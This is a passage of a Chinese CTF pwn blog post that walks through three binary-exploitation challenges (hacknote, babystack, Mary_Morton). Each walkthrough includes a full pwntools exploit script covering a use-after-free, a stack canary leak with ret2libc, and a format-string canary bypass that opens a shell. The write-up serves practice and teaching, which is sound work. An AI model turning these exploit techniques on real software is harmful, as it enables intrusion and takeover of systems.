+<h2 id="HITCON-hacknote"><a href="#HITCON-hacknote" class="headerlink" title="HITCON hacknote"></a>HITCON hacknote</h2><p>这题让我搞懂UAF了<br>首先看看程序整体就是个菜单<br><img src="7.jpg" srcset="/img/loading.gif" lazyload alt="7"><br>看看菜单内容<br><img src="8.png" srcset="/img/loading.gif" lazyload alt="8"><br>可以看到很多堆漏洞必备的功能<br><img src="9.png" srcset="/img/loading.gif" lazyload alt="9"><br>delete操作，单单free，会引起UAF<br>看看add操作<br><img src="10.png" srcset="/img/loading.gif" lazyload alt="10"><br>可以看到先申请俩指针，第一个指向put函数，第二个指向函数内容<br>利用方法就很简单了</p>
+<h3 id="漏洞利用-4"><a href="#漏洞利用-4" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先申请俩个大小大于12的块<br>然后free<br>再申请一个大小为8的块，覆盖put函数地址为magic<br>并用put打印触发漏洞</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs asm">#!&#x2F;usr&#x2F;bin&#x2F;env python<br># coding&#x3D;utf-8<br>from pwn import *<br>a &#x3D; process(&#39;.&#x2F;hacknote&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.recvuntil(&quot;Note size :&quot;)<br>a.sendline(&#39;16&#39;)<br>a.recvuntil(&quot;Content :&quot;)<br>a.sendline(&#39;aaaaaaaa&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.recvuntil(&quot;Note size :&quot;)<br>a.sendline(&#39;16&#39;)<br>a.recvuntil(&quot;Content :&quot;)<br>a.sendline(&#39;aaaaaaaa&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;2&#39;)<br>a.recvuntil(&quot;Index :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;2&#39;)<br>a.recvuntil(&quot;Index :&quot;)<br>a.sendline(&#39;0&#39;)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.recvuntil(&quot;Note size :&quot;)<br>a.sendline(&#39;8&#39;)<br>a.recvuntil(&quot;Content :&quot;)<br>pay &#x3D; p32(0x8048986)<br>a.sendline(pay)<br>a.recvuntil(&quot;Your choice :&quot;)<br>a.sendline(&#39;3&#39;)<br>a.recvuntil(&quot;Index :&quot;)<br>a.sendline(&#39;1&#39;)<br>a.interactive()<br></code></pre></td></tr></table></figure>
+<p>exp写的比较丑没有像标准wp一样定义函数<br>但能跑</p>
+<p>说下收获<br>1.堆得分配和释放<br>2.UAF的标准操作</p>
+<h2 id="厦门邀请赛"><a href="#厦门邀请赛" class="headerlink" title="厦门邀请赛"></a>厦门邀请赛</h2><p>写了4小时没出来。。。<br>后来看了wp，大致思路是对的，有些地方的优化做的不是太好</p>
+<h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>题目大致是个类似菜单的<br><img src="12.png" srcset="/img/loading.gif" lazyload alt="12"><br>1是输入<br>2是打印<br>有canary大致可以猜到是要泄露出canary才行<br><img src="13.png" srcset="/img/loading.gif" lazyload alt="13"><br>看程序发现输出函数是puts<br>//一开始还不知道puts输出到\x00才结束，试了几次后发现了这个漏洞<br>所以我们只需要填充栈，到canary之前<br>然后打印就能打出canary的高7个字节<br>最后一个字节经过调试发现一直是00所以需要填充<br>当然回车正好可以，所以用pwntools编写的时候需要注意必须是sendline而不是send<br>不然的话不能leak canary<br>canary leak后就可以ret2libc<br>leak出基地址后就差不多完事了</p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">from</span> pwn import *<br>elf = ELF(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br><span class="hljs-comment">#a = remote(&#x27;111.198.29.45&#x27;,49770)</span><br>a = process(<span class="hljs-string">&#x27;./babystack&#x27;</span>)<br>rdi_ret = 0x400a93<br>rsi_r15_ret = 0x400a91<br>lib = ELF(<span class="hljs-string">&#x27;./libc-2.23.so&#x27;</span>)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>fmt = <span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-number">*136</span><br>a.sendline(fmt)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>a.recvuntil(<span class="hljs-string">&#x27;1&#x27;</span><span class="hljs-number">*0</span>x88+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>canary = u64(a.recv(7).rjust(8,<span class="hljs-string">&#x27;\x00&#x27;</span>))<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&quot;canary found:&quot;</span>,hex(canary)<br>a.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*136</span> + p64(canary) + <span class="hljs-string">&#x27;bbbbbbbb&#x27;</span><br>pay += p64(rdi_ret) + p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>pay += p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])<br>pay += p64(0x400908)<br>a.sendline(pay)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>paddr = u64(a.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,<span class="hljs-attribute">drop</span>=<span class="hljs-literal">True</span>).ljust(8,&#x27;\x00&#x27;))<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;addr found:&#x27;</span>,hex(paddr)<br>base = paddr - lib.symbols[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = base + lib.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bash = base + lib.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).next()<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;one_gadget:&#x27;</span>,hex(one_gadget)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>pay = <span class="hljs-string">&#x27;a&#x27;</span><span class="hljs-number">*136</span> + p64(canary) + <span class="hljs-string">&#x27;bbbbbbbb&#x27;</span> + p64(rdi_ret) + p64(bash) + p64(sys)<br>a.send(pay)<br><span class="hljs-builtin-name">print</span> a.recv()<br>a.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;#############&#x27;</span><br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;are you ready&#x27;</span><br><span class="hljs-builtin-name">print</span> <span class="hljs-string">&#x27;#############&#x27;</span><br>a.interactive()<br></code></pre></td></tr></table></figure>
+<h2 id="ASIS-CTF-Finals-2017-Mary-Morton"><a href="#ASIS-CTF-Finals-2017-Mary-Morton" class="headerlink" title="ASIS-CTF-Finals-2017 Mary_Morton"></a>ASIS-CTF-Finals-2017 Mary_Morton</h2><p>和上面一题有点像，但是简单了好多<br>就是个格式化字符串绕canary<br>后门都已经写好了给你</p>
+<h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> pwn import *<br><span class="hljs-keyword">a</span> = remote(<span class="hljs-string">&#x27;111.198.29.45&#x27;</span>,<span class="hljs-number">32882</span>)<br><span class="hljs-comment">#a = process(&#x27;./mary_morton&#x27;)</span><br>print <span class="hljs-keyword">a</span>.recv()<br>print <span class="hljs-keyword">a</span>.recv()<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&#x27;%23$lx&#x27;</span>)<br>test = <span class="hljs-keyword">a</span>.recv(<span class="hljs-number">16</span>)<br>canary = int(test,<span class="hljs-number">16</span>)<br>print hex(canary)<br><span class="hljs-keyword">a</span>.recvuntil(<span class="hljs-string">&quot;3. Exit the battle &quot;</span>)<br><span class="hljs-keyword">a</span>.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>backdoor = <span class="hljs-number">0x00000000004008DA</span><br>pay = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">136</span> + p64(canary) + <span class="hljs-string">&#x27;bbbbbbbb&#x27;</span> + p64(backdoor)<br><span class="hljs-keyword">a</span>.sendline(pay)<br><span class="hljs-keyword">a</span>.interactive()<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/ctf/">#ctf</a>
+      
+        <a href="/tags/pwn/">#pwn</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>PWN养成计划</div>
+      <div>http://www.psbazx.com/2019/04/10/PWN养成计划/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Beitragsautor</div>
+          <div>皮三宝</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Veröffentlicht am</div>
+          <div>April 9, 2019</div>
+        </div>
+      
+      
+      <div class="license-meta-item">
+        <div>Urheberrechtshinweis</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/04/14/susctf-2019/" title="susctf 2019">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">susctf 2019</span>
+                        <span class="visible-mobile">Vorheriger</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/04/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E5%B0%8F%E7%BB%93-re%E9%A2%98%E8%A7%A3-%E9%99%84%E9%A2%98/" title="西湖论剑小结-re题解(附题)">
+                        <span class="hidden-mobile">西湖论剑小结-re题解(附题)</span>
+                        <span class="visible-mobile">Nächster</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;Inhaltsverzeichnis</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Suchen</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Stichwort</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog funktioniert am besten mit aktiviertem JavaScript</div>
+  </noscript>
+</body>
+</html>
